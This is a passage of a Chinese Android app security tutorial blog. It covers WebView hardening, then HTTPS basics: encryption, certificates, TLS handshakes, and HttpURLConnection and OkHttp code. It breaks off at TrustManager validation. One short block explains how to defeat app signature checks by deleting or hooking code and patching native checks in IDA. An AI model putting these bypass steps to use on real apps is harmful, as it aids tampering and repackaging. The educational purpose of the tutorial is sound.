class=\"literal\">false</span>)</span><br><span class=\"line\"> setAllowUniversalAccessFromFileURLs(<span class=\"literal\">false</span>)</span><br><span class=\"line\"> （<span class=\"number\">3</span>）手机厂商把手机内置的WebView与google保持更新一致</span><br><span class=\"line\"> （<span class=\"number\">4</span>）用户随时把手机的内置 webview以及使用的浏览器更新到最新版本</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"六、实验总结\"><a href=\"#六、实验总结\" class=\"headerlink\" title=\"六、实验总结\"></a>六、实验总结</h2><p>本文总结归纳了Android中的权限安全漏洞和安全配置漏洞的详细信息，并拿一些案例进行了复现讲解，本文中只是对大部分这些漏洞的一个归纳总结，里面存在的一些问题就请各位指正了，本文所用到的实验样例和相关附件，后面都会上传github，详细大家参考：<a href=\"https://github.com/guoxuaa/Android-Vulnerability-Mining/tree/main/1.Android%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98\">github地址</a></p>\n<h2 id=\"七、参考文献\"><a href=\"#七、参考文献\" class=\"headerlink\" title=\"七、参考文献\"></a>七、参考文献</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">第一行代码</span><br><span class=\"line\">卢璐. Android应用权限泄露漏洞检测技术研究[D].西安电子科技大学,<span class=\"number\">2018.</span></span><br><span class=\"line\">姜维 Android应用安全防护和逆向分析</span><br><span class=\"line\">https:<span class=\"comment\">//juejin.cn/post/6844903997669638151#heading-13</span></span><br><span class=\"line\">https:<span class=\"comment\">//juejin.cn/post/6844903817662693384</span></span><br><span class=\"line\">https:<span class=\"comment\">//blog.csdn.net/qq_38350635/article/details/103863992</span></span><br><span class=\"line\">https:<span class=\"comment\">//ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</span></span><br><span class=\"line\">https:<span class=\"comment\">//www.cnblogs.com/yaq-qq/p/5843127.html</span></span><br><span class=\"line\">ttps:<span class=\"comment\">//www.codeleading.com/article/67095305050/</span></span><br><span class=\"line\">https:<span class=\"comment\">//github.com/nelenkov/android-backup-extractor/</span></span><br><span class=\"line\">https:<span class=\"comment\">//blog.csdn.net/qq_43290288/article/details/98873651</span></span><br><span class=\"line\">https:<span class=\"comment\">//segmentfault.com/a/1190000002590577</span></span><br><span class=\"line\">https:<span class=\"comment\">//ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</span></span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（15）——Https（http）通信漏洞详解","url":"/2023/02/14/bug0015/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>本文主要介绍Android http&#x2F;https方面的安全漏洞问题，并会从原理并结合案例来逐一讲解，本文一部分参考网络上一些博客，并在相应部分给出链接</p>\n<p>本文第二节主要讲述Android http&#x2F;https相关的基础知识</p>\n<p>本文第三节为漏洞原理解析和漏洞复现</p>\n<p>本文第四节为Android https转包漏洞介绍</p>\n<span id=\"more\"></span>\n<h2 id=\"二、基础知识\"><a href=\"#二、基础知识\" class=\"headerlink\" title=\"二、基础知识\"></a>二、基础知识</h2><h3 id=\"1-加密算法\"><a href=\"#1-加密算法\" class=\"headerlink\" title=\"1.加密算法\"></a>1.加密算法</h3><h4 id=\"（1）对称加密\"><a href=\"#（1）对称加密\" class=\"headerlink\" title=\"（1）对称加密\"></a>（1）对称加密</h4><p>对称加密算法是双方都持有相同的密钥进行通信，加密速度很快</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/1.png\" alt=\"image-20211204145051628\"></p>\n<p>特点：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">a.加密和解密都是用同一个秘钥</span><br><span class=\"line\">b.加密、解密效率高</span><br><span class=\"line\">c.秘钥被窃取，容易造成数据不安全</span><br><span class=\"line\">常见的对称加密算法有DES、3DES、AES等，这里我们就不深入讲解了</span><br></pre></td></tr></table></figure>\n\n<p>缺点：</p>\n<p>上面的对称加密模型最大的问题就是，对称加密模型需要一个安全的信道来传输对称密钥，但是如果真的存在一个真正安全的信道，那直接用这个信道来传输数据就可以了，这就有点矛盾了</p>\n<h4 id=\"（2）非对称加密\"><a href=\"#（2）非对称加密\" class=\"headerlink\" title=\"（2）非对称加密\"></a>（2）非对称加密</h4><p>非对称加密，是为了解决对称加密中的安全问题而诞生，含有一对密钥：公钥和私钥，发送方用公钥进行加密，公钥可以被公开，接收方用私钥进行解密，私钥不可公开</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/2.png\" alt=\"image-20211204150154475\"></p>\n<p>特点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">a.用公钥加密用私钥解密</span><br><span class=\"line\">b.加密、解密相对于对称加密效率更低，但是比对称加密更安全</span><br><span class=\"line\">c.公钥可能被中间人伪造，造成数据不安全</span><br><span class=\"line\">常见的非对称加密算法有RSA、DSA等</span><br></pre></td></tr></table></figure>\n\n<p>缺点：</p>\n<p>如何保证加密的是接收方的公钥，如何安全的传输公钥</p>\n<h3 id=\"2-信息安全问题\"><a href=\"#2-信息安全问题\" class=\"headerlink\" title=\"2.信息安全问题\"></a>2.信息安全问题</h3><p>我们在传输数据的过程中往往着眼于三个方面的安全问题：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）信息的保密性</span><br><span class=\"line\">（<span class=\"number\">2</span>）信息的完整性</span><br><span class=\"line\">（<span class=\"number\">3</span>）身份识别</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（1）信息的保密性\"><a href=\"#（1）信息的保密性\" class=\"headerlink\" title=\"（1）信息的保密性\"></a>（1）信息的保密性</h4><p>我们一般会使用各种加密算法对我们传输的数据信息进行加密，即使用上面的对称加密和非对称加密来完成，但无论是对称加密还是非对称加密都存在一个共同的安全问题：<code>密钥如何传递，而且提高传输速率</code>，一般公用的方法是采用<code>对称加密+非对称加密结合</code>，即双方都在使用对称加密进行传输，但是会存在密钥不能保证安全性的问题，此时我们使用公钥对对称密钥进行加密，然后接收方使用私钥对对称密钥进行解密，这样就可以解决这个问题</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/3.png\" alt=\"image-20211204151540175\"></p>\n<h4 id=\"（2）信息的完整性（数字签名）\"><a href=\"#（2）信息的完整性（数字签名）\" class=\"headerlink\" title=\"（2）信息的完整性（数字签名）\"></a>（2）信息的完整性（数字签名）</h4><p>数据在传输的过程中，我们的信息可能被第三方劫持篡改，所以我们要保证信息的完整性，一般通过使用散列函数如SHA1，MD5将传输内容hash依次获得hash值，即摘要。客户端使用服务端的公钥对摘要和信息内容进行加密，传输给服务端，服务端使用私钥进行解密，然后用相同的hash算法对原始内容进行hash，然后与摘要值对比，如果一直，说明信息是完整的</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/4.png\" alt=\"image-20211204152606806\"></p>\n<p>举例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android APP应用一般就具有签名验证机制，以防止恶意攻击者在对APP进行逆向之后，重打包，一般来说Android APP的签名机制分为3类：</span><br><span class=\"line\">（1）java本地验证，在java代码中有hash函数验证，我们通常搜索signature定位到目标代码段，直接删除或hook该代码段即可</span><br><span class=\"line\">（2）so本地验证，为了加强逆向难度，很多公司会将APP验证写在so层，这一般我们通过IDA动态调试，获取代码段然后NOP即可</span><br><span class=\"line\">（3）网络服务器验证，一般来说这种进行网络hash验证，一般这种通过抓包，但有一些加密后变很难处理了</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）身份识别（数字证书）\"><a href=\"#（3）身份识别（数字证书）\" class=\"headerlink\" title=\"（3）身份识别（数字证书）\"></a>（3）身份识别（数字证书）</h4><p>我们在信息传输过程中，通常要验证信息的发送方的身份，我们将发送端的公钥发送给接收端，发送端通过把自己的内容使用私钥加密然后发送给接收端，接收端只能使用发送端的公钥加密，自然就验证了发送端的身份</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/5.png\" alt=\"image-20211204154251711\"></p>\n<p>数字证书：</p>\n<p>但是上述过程中存在一个问题，在传输的过程中，客户端如何获得服务器的公钥呢？当服务器分发给客户端，如果一开始服务端发送的公钥到客户端就被第三方劫持，然后第三方自己伪造一对密钥，将公钥发送给客户端，当服务端发生数据给客户端的时候，中间人就将信息劫持，用一开始劫持的公钥进行解密，然后将自己的私钥将数据发送给客户端，而客户端收到后使用公钥解密，这个过程中中间人是透明的，就可以获取信息了</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/6.png\" alt=\"image-20211204162208265\"></p>\n<p>为了防止这种中间人攻击，数字证书就出现了，其实是基于上面所说的私钥加密数据，公钥解密来验证其身份</p>\n<p>数字证书是由权威的CA（Certificate Authority）机构给服务端进行颁发，CA机构通过服务端提供的相关信息生成证书，证书内容包含了持有人的相关信息，服务器的公钥，签署者签名信息（数字签名）等，最重要的是公钥在数字证书中</p>\n<p>数字证书由权威的CA（Certificate Authority）机构给服务端进行颁发，CA机构通过服务端提供的相关信息生成证书，证书内容包含了持有人的相关信息，服务器的公钥，签署者签名信息（数字签名）等，最重要的是<code>公钥在数字证书</code>中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(1)数字证书是如何保证公钥来自于请求的服务器呢？</span><br><span class=\"line\">数字证书上由持有人的相关信息，通过这点可以确定其不是一个中间人</span><br><span class=\"line\">(2)如何保证数字证书为真呢？</span><br><span class=\"line\">一个证书中含有三个部分:&quot;证书内容，散列算法，加密密文&quot;，证书内容会被散列算法hash计算出hash值，然后使用CA机构提供的私钥进行RSA加密</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/7.png\" alt=\"image-20211204162925136\"></p>\n<p>客户端完成验证过程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">当客户端发起请求是，服务端将该数字证书发送到客户端，客户端通过CA机构提供的公钥对加密密文来进行解密获得散列值（数字签名），同时将证书内容使用相同的散列算法进行Hash得到另一个散列值，比对两个散列值，如果两者相等则说明证书没问题</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/8.png\" alt=\"image-20211204163230226\"></p>\n<p>一些常见的证书分类：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">X.509#DER 二进制格式证书，常用后缀.cer .crt</span><br><span class=\"line\">X.509#PEM 文本格式证书，常用后缀.pem</span><br><span class=\"line\">有的证书内容是只包含公钥（服务器的公钥），如.crt、.cer、.pem</span><br><span class=\"line\">有的证书既包含公钥又包含私钥（服务器的私钥），如.pfx、.p12</span><br></pre></td></tr></table></figure>\n\n<p>为了保证证书的一致性，国际电信联盟设计了一套专门针对证书格式的标准X.509，其核心提供了一种描述证书的格式</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/9.png\" alt=\"image-20211204163230226\"></p>\n<h3 id=\"3-Http-x2F-Https详解\"><a href=\"#3-Http-x2F-Https详解\" class=\"headerlink\" title=\"3.Http&#x2F;Https详解\"></a>3.Http&#x2F;Https详解</h3><h4 id=\"（1）TLS-x2F-SSL\"><a href=\"#（1）TLS-x2F-SSL\" class=\"headerlink\" title=\"（1）TLS&#x2F;SSL\"></a>（1）TLS&#x2F;SSL</h4><p>http:超文本传输协议，采用明文的方式去传输数据，经过我们上文的分析，在这个过程中很容易导致中间人攻击，因此为了进一步增强数据传输的安全性，开始出现https，而在此之前我们就需要了解一下TLS&#x2F;SSL</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SSL：（Secure Socket Layer，安全套接字层），位于可靠的面向连接的网络层协议和应用层协议之间的一种协议层。SSL通过互相认证、使用数字签名确保完整性、使用加密确保私密性，以实现客户端和服务器之间的安全通讯</span><br><span class=\"line\">TLS：(Transport Layer Security，传输层安全协议)，用于两个应用程序之间提供保密性和数据完整性</span><br></pre></td></tr></table></figure>\n\n<p>我们先看一下SSL和TLS的区别：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">简而言之，TLS只是SSL后来迭代的版本而已，在1994年，NetScape设计了SSL协议，1999年，互联网标准化组织ISOC接替NetScape公司，发布了SSL的升级版TLS 1.0版，因此可以理解为TLS 1.0 = SSL 3.1，只是SSL后来的的版本而已</span><br></pre></td></tr></table></figure>\n\n<p>SSL协议即用到了对称加密也用到了非对称加密(公钥加密)，在建立传输链路时，SSL首先对对称加密的密钥使用公钥进行非对称加密，链路建立好之后，SSL对传输内容使用对称加密</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.对称加密</span><br><span class=\"line\">速度高，可加密内容较大，用来加密会话过程中的消息</span><br><span class=\"line\"></span><br><span class=\"line\">2.公钥加密</span><br><span class=\"line\">加密速度较慢，但能提供更好的身份认证技术，用来加密对称加密的密钥</span><br></pre></td></tr></table></figure>\n\n<p>因此，HTTPs &#x3D; HTTP + TLS&#x2F;SSL</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/10.png\" alt=\"image-20211204165055568\"></p>\n<h4 id=\"（2）HTTPs的单向认证和双向认证\"><a href=\"#（2）HTTPs的单向认证和双向认证\" class=\"headerlink\" title=\"（2）HTTPs的单向认证和双向认证\"></a>（2）HTTPs的单向认证和双向认证</h4><h5 id=\"lt-1-gt-单向认证\"><a href=\"#lt-1-gt-单向认证\" class=\"headerlink\" title=\"&lt;1&gt;单向认证\"></a>&lt;1&gt;单向认证</h5><p>Https在建立Socket连接之前，需要进行握手，具体流程：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/11.png\" alt=\"image-20211204165055568\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。</span><br><span class=\"line\"><span class=\"number\">2.</span>服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书</span><br><span class=\"line\"><span class=\"number\">3.</span>客户端使用服务端返回的信息验证服务器的合法性，包括：</span><br><span class=\"line\">    (<span class=\"number\">1</span>)证书是否过期</span><br><span class=\"line\">    (<span class=\"number\">2</span>)发型服务器证书的CA是否可靠</span><br><span class=\"line\">    (<span class=\"number\">3</span>)返回的公钥是否能正确解开返回证书中的数字签名</span><br><span class=\"line\">    (<span class=\"number\">4</span>)服务器证书上的域名是否和服务器的实际域名相匹配、验证通过后，将继续进行通信，否则，终止通信</span><br><span class=\"line\"><span class=\"number\">4.</span>客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择</span><br><span class=\"line\"><span class=\"number\">5.</span>服务器端在客户端提供的加密方案中选择加密程度最高的加密方式。</span><br><span class=\"line\"><span class=\"number\">6.</span>服务器将选择好的加密方案通过明文方式返回给客户端</span><br><span class=\"line\"><span class=\"number\">7.</span>客户端接收服务端返回的加密方式后，使用该加密方式生成产生随机码，用作通信过程中对称加密的密钥，使用服务端返回的公钥进行加密，将加密后的随机码发送至服务器</span><br><span class=\"line\"><span class=\"number\">8.</span>服务器收到客户端返回的加密信息后，使用自己的私钥进行解密，获取对称加密密钥。在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-双向认证\"><a href=\"#lt-2-gt-双向认证\" class=\"headerlink\" title=\"&lt;2&gt;双向认证\"></a>&lt;2&gt;双向认证</h5><p>双向认证和单向认证原理基本差不多，只是除了客户端需要认证服务端以外，增加了服务端对客户端的认证，具体过程如下：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/12.png\" alt=\"image-20211204165055568\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。</span><br><span class=\"line\"><span class=\"number\">2.</span>服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书</span><br><span class=\"line\"><span class=\"number\">3.</span>客户端使用服务端返回的信息验证服务器的合法性，包括：</span><br><span class=\"line\">    (<span class=\"number\">1</span>)证书是否过期</span><br><span class=\"line\">    (<span class=\"number\">2</span>)发型服务器证书的CA是否可靠</span><br><span class=\"line\">    (<span class=\"number\">3</span>)返回的公钥是否能正确解开返回证书中的数字签名</span><br><span class=\"line\">    (<span class=\"number\">4</span>)服务器证书上的域名是否和服务器的实际域名相匹配、验证通过后，将继续进行通信，否则，终止通信</span><br><span class=\"line\"><span class=\"number\">4.</span>服务端要求客户端发送客户端的证书，客户端会将自己的证书发送至服务端</span><br><span class=\"line\"><span class=\"number\">5.</span>验证客户端的证书，通过验证后，会获得客户端的公钥</span><br><span class=\"line\"><span class=\"number\">6.</span>客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择</span><br><span class=\"line\"><span class=\"number\">7.</span>服务器端在客户端提供的加密方案中选择加密程度最高的加密方式</span><br><span class=\"line\"><span class=\"number\">8.</span>将加密方案通过使用之前获取到的公钥进行加密，返回给客户端</span><br><span class=\"line\"><span class=\"number\">9.</span>客户端收到服务端返回的加密方案密文后，使用自己的私钥进行解密，获取具体加密方式，而后，产生该加密方式的随机码，用作加密过程中的密钥，使用之前从服务端证书中获取到的公钥进行加密后，发送给服务端</span><br><span class=\"line\"><span class=\"number\">10.</span>服务端收到客户端发送的消息后，使用自己的私钥进行解密，获取对称加密的密钥，在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-Android-Http网络开发\"><a href=\"#4-Android-Http网络开发\" class=\"headerlink\" title=\"4.Android Http网络开发\"></a>4.Android Http网络开发</h3><p>我们要学习Https通信漏洞挖掘，首先就需要掌握基本的Android http网络开发，因为开发和逆向漏洞总是相互相成的，Android 的HTTP的网络通信框架一般包括两类：第一类是原生的Android网络HTTP通信库，原生网路通信库主要通过HttpURLConnection以及HttpClient两个类完成，但是Android6.0后，Andriod中的SDK就去掉了HttpClient的支持，Android 9后，Android就直接取消了HttpClient的支持，但是由于网络通信的操作涉及异步、多线程和效率的问题，HttpURLConnection中并未对这些操作进行完整的封装，就出现第二类网络通信框架——第三方HTTP(s)的网络请求框架，一般为：okhttp、Volley等，这里我们只介绍当下使用比较广泛的框架</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/13.png\" alt=\"image-20211205134303663\"></p>\n<h4 id=\"（1）HttpURLConnection\"><a href=\"#（1）HttpURLConnection\" class=\"headerlink\" title=\"（1）HttpURLConnection\"></a>（1）HttpURLConnection</h4><p>获取HttpURLConnection实例，通过openConnection()获取</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">URL</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">URL</span>(<span class=\"string\">&quot;http://www,baidu.com&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">HttpURLConnection</span> <span class=\"variable\">connection</span> <span class=\"operator\">=</span> (HttpURLConnection) url.openConnection();</span><br></pre></td></tr></table></figure>\n\n<p>设置HTTP请求使用的方法，<code>GET</code>表示希望从服务器那里获取数据，<code>POST</code>表示提交数据给服务器</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">connection.setRequestMethod(<span class=\"string\">&quot;GET&quot;</span>);</span><br><span class=\"line\">或者</span><br><span class=\"line\">connection.setRequestMethod(<span class=\"string\">&quot;POST&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>再就是一些自由定制，如设置连接超时、读取超时的毫秒数、服务器的一些消息头等</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">connection.setRequestProperty(<span class=\"string\">&quot;token&quot;</span>,<span class=\"string\">&quot;wwanghai&quot;</span>);<span class=\"comment\">//设置请求参数</span></span><br><span class=\"line\">connection.setConnectTimeout(<span class=\"number\">8000</span>);<span class=\"comment\">//设置连接超时时间</span></span><br><span class=\"line\">connection.setReadTimeout(<span class=\"number\">8000</span>);<span class=\"comment\">//设置接收超时时间</span></span><br></pre></td></tr></table></figure>\n\n<p>调用getInputStream()方法获取服务器返回的输入流</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">InputStream</span> <span class=\"variable\">in</span> <span class=\"operator\">=</span> connection.getInputStream();</span><br></pre></td></tr></table></figure>\n\n<p>我们可以用字节数组保存读取的数据</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"variable\">bufferSize</span> <span class=\"operator\">=</span> <span class=\"number\">1024</span>;</span><br><span class=\"line\"><span class=\"type\">byte</span>[] buffer = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[bufferSize];</span><br><span class=\"line\"><span class=\"type\">StringBuffer</span> <span class=\"variable\">sb</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuffer</span>();</span><br><span class=\"line\"><span class=\"keyword\">while</span> (in.read(buffer)!=-<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">     sb.append(<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(buffer));</span><br><span class=\"line\">     &#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后调用disconnect()方法将HTTP连接关闭掉</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">connection.disconnect();</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）okhttp3\"><a href=\"#（2）okhttp3\" class=\"headerlink\" title=\"（2）okhttp3\"></a>（2）okhttp3</h4><p>okHttp的项目主页地址是：<a href=\"https://github.com/square/okhttp\">okHttp</a></p>\n<p>我们需要在项目中添加依赖，编辑app&#x2F;build.gradle文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">implementation(<span class=\"string\">&quot;com.squareup.okhttp3:okhttp:3.12.0&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>首先创建一个OkHttpClient的实例</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">OkHttpClient</span> <span class=\"variable\">client</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>();</span><br><span class=\"line\">或者加一些设置</span><br><span class=\"line\"><span class=\"type\">OkHttpClient</span> <span class=\"variable\">client</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">                                        .readTimeout(<span class=\"number\">5</span>, TimeUnit.SECONDS)  <span class=\"comment\">//设置读超时</span></span><br><span class=\"line\">                                        .writeTimeout(<span class=\"number\">5</span>, TimeUnit.SECONDS)  <span class=\"comment\">//设置写超时</span></span><br><span class=\"line\">                                        .connectTimeout(<span class=\"number\">15</span>,TimeUnit.SECONDS) <span class=\"comment\">//设置连接超时</span></span><br><span class=\"line\">                                        .retryOnConnectionFailure(<span class=\"literal\">true</span>) <span class=\"comment\">//是否自动重连</span></span><br><span class=\"line\">                                        .build();</span><br></pre></td></tr></table></figure>\n\n<p>如果要发起HTTP请求，就需要创建一个Request对象</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET:</span><br><span class=\"line\">    <span class=\"type\">Request</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Request</span>.Builder().build(); <span class=\"comment\">//这是一个空的对象</span></span><br><span class=\"line\">    实际使用中</span><br><span class=\"line\">    <span class=\"type\">Request</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Request</span>.Builder()</span><br><span class=\"line\">                                  .url(<span class=\"string\">&quot;http://www,baidu.com&quot;</span>)</span><br><span class=\"line\">                                  .header(<span class=\"string\">&quot;token&quot;</span>,<span class=\"string\">&quot;wanghai&quot;</span>)</span><br><span class=\"line\">                                  .build();</span><br><span class=\"line\">POST：</span><br><span class=\"line\">    <span class=\"comment\">//需要先构建一个RequestBody来存放待提交的参数，然后再传入Request</span></span><br><span class=\"line\">    <span class=\"type\">RequestBody</span> <span class=\"variable\">requestBody</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FormBody</span>.Builder()</span><br><span class=\"line\">                                            .add(<span class=\"string\">&quot;username&quot;</span>,<span class=\"string\">&quot;damin&quot;</span>)</span><br><span class=\"line\">                                            .add(<span class=\"string\">&quot;password&quot;</span>,<span class=\"string\">&quot;123456&quot;</span>)</span><br><span class=\"line\">                                            .build();</span><br><span class=\"line\">\t<span class=\"type\">Request</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Request</span>.Builder()</span><br><span class=\"line\">                                  .url(<span class=\"string\">&quot;http://www,baidu.com&quot;</span>)</span><br><span class=\"line\">                                  .post(requestBody)</span><br><span class=\"line\">                                  .build();</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>调用OkHttpClient的newCall()方法来创建一个Call对象，并调用execute()方法来发送请求并获取服务器返回的数据，response对象就是服务器返回的数据</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Response</span> <span class=\"variable\">response</span> <span class=\"operator\">=</span> client.newCall(request).execute();</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">responseData</span> <span class=\"operator\">=</span> response.body().string();</span><br></pre></td></tr></table></figure>\n\n<p>还可以使用异步方式来获取数据，Android中大部分都使用异步方式来获取数据，通过enqueue（）函数产生一次真实的网络请求，通过onResponse（）函数进行回调</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">client.newCall(request).enqueue(<span class=\"keyword\">new</span> <span class=\"title class_\">Callback</span>() &#123;</span><br><span class=\"line\">               <span class=\"meta\">@Override</span></span><br><span class=\"line\">               <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onFailure</span><span class=\"params\">(Call call, IOException e)</span> &#123;</span><br><span class=\"line\">                   call.cancel();</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">               <span class=\"meta\">@Override</span></span><br><span class=\"line\">               <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onResponse</span><span class=\"params\">(Call call, Response response)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">                   <span class=\"type\">String</span> <span class=\"variable\">responseData</span> <span class=\"operator\">=</span> response.body().string();</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">           &#125;);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）各自证书的校验方式\"><a href=\"#（3）各自证书的校验方式\" class=\"headerlink\" title=\"（3）各自证书的校验方式\"></a>（3）各自证书的校验方式</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）根据 app 内置证书 KeyStore 生成 TrustManager 验证</span><br><span class=\"line\">（<span class=\"number\">2</span>）自定义 SSLSocketFactory(org.apache.http.conn.ssl.SSLSocketFactory)实现 TrustManager 验证策略(httpClient)</span><br><span class=\"line\">（<span class=\"number\">3</span>）自定义SSLSocketFactory(javax.net.ssl.SSLSocketFactory)实现TrustManager 验证策略(HttpsURLConnection,OkHttp3)</span><br><span class=\"line\">（<span class=\"number\">4</span>）自定义的 HostnameVerifier 和 X509TrustManager 实现验证</span><br><span class=\"line\">（<span class=\"number\">5</span>）第三方库中的验证，如 OkHttp3 中的 CertificatePinner(证书锁定)</span><br><span class=\"line\">（<span class=\"number\">6</span>）WebView 加载 Https 页面时证书校验出错，停止加载</span><br></pre></td></tr></table></figure>\n\n<p>下面是比较常见的实现https类的各自证书校验方式：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/30.png\" alt=\"image-20211205163031752\"></p>\n<p>下面是证书验证的一些关系示意图，参考链接：<a href=\"https://docs.oracle.com/javase/6/docs/technotes/guides/security/jsse/JSSERefGuide.html\">证书关系</a></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/31.png\" alt=\"image-20211205163311496\"></p>\n<p>上图中要进行 SSL 会话，必须先建立一个 SSLSocket 对象，而 SSLSocket 对象是通过 SSLSocketFactory 来管理的，SSLSocketFactory 对象则依赖于 SSLContext ，SSLContext 对象的初始化需要 keyManager、TrustManager 和 SecureRandom。TrustManager 对象是我们后文比较关心的，因为正是 TrustManager 负责证书的校验，对网站进行认证，要想确保数据不被中间人抓包分析，就需要实现这个类进行验证，以保障数据的安全性</p>\n<p>在整个过程中 TrustManager 类专门负责校验证书，可以改写 TrustManager 